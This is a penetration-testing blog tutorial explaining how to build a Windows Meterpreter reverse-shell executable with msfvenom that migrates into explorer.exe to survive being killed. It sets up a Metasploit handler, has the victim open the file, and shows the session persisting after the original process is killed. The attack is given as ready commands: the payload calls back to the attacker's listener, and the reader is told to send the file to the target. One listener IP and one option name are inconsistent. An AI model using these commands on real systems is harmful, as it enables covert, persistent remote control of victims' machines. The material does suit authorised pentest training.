<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">Hiding Shell with Prepend Migrate using Msfvenom</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hiding-shell-prepend-migrate-using-msfvenom/" rel="bookmark"><time class="entry-date published" datetime="2017-03-21T18:55:39+00:00">March 21, 2017</time><time class="updated" datetime="2025-05-27T12:03:48+00:00">May 27, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">If you are a network penetration tester then you must read this article to enhance your skill. It is the part of advanced penetration testing which might help in creating a strong payload for an attack to the targeted system. In this article you will learn more about the strength of msfvenom, here we will create such a payload which is different from my previous tutorial. The payload migrates its process if the current process gets killed hence the attacker will not lose his session if the victim kills the current process ID of the payload from its system.</span></p>
<p><span style="color: #000000;"><strong>Let,s Start</strong></span></p>
<p><span style="color: #000000;">Open the terminal in kali Linux and type following command to generate exe payload.</span></p>
<pre class="lang:default decode:true">msfvenom –p windows/meterpreter/reverse_tcp lhost=192.168.1.104 lport=5555 prependmigrate=true prepenmigrateprocess=explorer.exe –f exe &gt; /root/Desktop/raj.exe</pre>
<p><span style="color: #000000;">Above command will create the <strong>raj.exe</strong> file on the Desktop now <strong>send</strong> this file to a remote system for the attack.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-P49yP-JY9gY/WNF2GohxzwI/AAAAAAAAPmI/0Qt1oZhd4DoDAMe4uBLpxtCBTTrV8jBlACLcB/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Load metasploit framework and type following command to start the attack.</span></p>
<pre class="lang:default decode:true">use multi/handler
msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp
msf exploit(handler) &gt; set lhost 192.168.0.104
msf exploit(handler) &gt; set lport 5555
msf exploit(handler) &gt; exploit</pre>
<p><span style="color: #000000;"><strong> </strong>When victim will open the raj.exe file we will get the meterpreter session.</span></p>
<pre class="lang:default decode:true">meterpreter&gt; sysinfo</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-iJhWTxdhYNQ/WNF2GpjllGI/AAAAAAAAPmE/_Xwx9NvE-jMq9VoEuSPdWeucC1mlKD7dQCLcB/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Now let check the process ID of our payload.</span></p>
<pre class="lang:default decode:true">meterpreter&gt; ps</pre>
<p><span style="color: #000000;">From the highlighted text you can read the process ID shown for raj.exe i.e. 4960.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-IlbV-lrFonQ/WNF2GhwdgsI/AAAAAAAAPmM/VmhRTKZeino8Awsc8hx146XMeNscsjEOwCLcB/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Now attacker tries himself to kill the current process state for raj.exe to verify process migration, as result process 4960 get killed.</span></p>
<pre class="lang:default decode:true">meterpreter&gt; kill 4960</pre>
<p><span style="color: #000000;"><strong>But!!! </strong> Still, we have a victim’s session which means raj.exe file migrate into new process ID.</span></p>
<pre class="lang:default decode:true">meterpreter&gt; sysinfo</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-vVoobQq9zLg/WNF2HWLYtCI/AAAAAAAAPmQ/rtEVgnb3oQUBr5hcI4GS8Ob-Er9MQNdggCLcB/s1600/4.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact</span><a href="https://www.linkedin.com/in/aarti--singh/"><strong> here</strong></a></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
